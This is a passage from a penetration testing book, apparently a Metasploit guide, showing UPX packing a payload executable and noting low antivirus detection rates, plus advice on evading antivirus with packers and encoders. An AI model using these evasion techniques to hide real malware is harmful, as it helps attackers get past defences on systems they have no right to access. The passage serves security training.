                          Copyright (C) 1996 - 2009
UPX 3.04         Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 27th 2009

   File size              Ratio      Format        Name
   --------------------   ------     -----------   -----------
   37888 -&gt;     22528     59.46% <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>  win32/pe      payload3.exe

Packed 1 file.</pre><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9772" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> we install <span class="strong"><em class="calibre4">UPX</em></span>, and then at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9781" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we run <span class="strong"><em class="calibre4">UPX</em></span> with no arguments to view its command line options. Then at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9790" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> we use the <code class="literal">−5</code> option to compress and pack our executable. You can see at <span class="inlinemediaobject"><a id="I_inlinemediaobject7_d1e9800" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> that <span class="strong"><em class="calibre4">UPX</em></span> compresses our payload 59.46 percent.</p><p class="calibre2">In our tests, only 9 of 42 antivirus vendors detected the <span class="strong"><em class="calibre4">UPX</em></span>-packed binaries.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">The PolyPack project (<a class="xref" href="http://jon.oberheide.org/files/woot09-polypack.pdf" target="_top">http://jon.oberheide.org/files/woot09-polypack.pdf</a>) shows the results of packing known malicious binaries with various packers and the effectiveness of antivirus detection before and after the packing process.<a id="IDX-CHP-7-0031" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><div class="book"><hr class="calibre5"/></div><div class="sidebar"><a id="msf_venom" class="strong"/><h3 class="title7">Msf Venom</h3><p class="calibre2">In this chapter we cover only the <span class="strong"><em class="calibre4">msfpayload</em></span> and <span class="strong"><em class="calibre4">msfencode</em></span> utilities, but there is an additional tool called <span class="strong"><em class="calibre4">msfvenom</em></span> that combines the functionalities of <span class="strong"><em class="calibre4">msfpayload</em></span> and <span class="strong"><em class="calibre4">msfencode</em></span> in a simpler-to-use interface. <span class="strong"><em class="calibre4">Msfvenom</em></span> is not covered in detail in this book (see <a class="xref" href="part0023.html#cheat_sheet">Appendix B</a>), but it should be very easy to use after you become familiar with <span class="strong"><em class="calibre4">msfpayload</em></span> and <span class="strong"><em class="calibre4">msfencode</em></span>.<a id="IDX-CHP-7-0032" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="a_final_note_on_antivirus_software_evasi">A Final Note on Antivirus Software Evasion</h2></div></div></div><p class="calibre2">The world of antivirus software moves very quickly, even by Internet standards. As of this writing, the methods and processes documented in this chapter work successfully; however, experience has shown that even a few months can bring major changes in how antivirus evasion is accomplished. Although the Metasploit team is constantly tweaking its payloads and attempts to stay one step ahead of detection algorithms, don’t be surprised if by the time you work through these examples, some work and some do not. When you’re attempting antivirus evasion, consider using multiple packers or encoders, as mentioned, or write your own. Antivirus evasion, like all penetration testing skills, needs to be practiced and requires dedicated research to help you ensure success in your engagements.</p></div></section></body></html>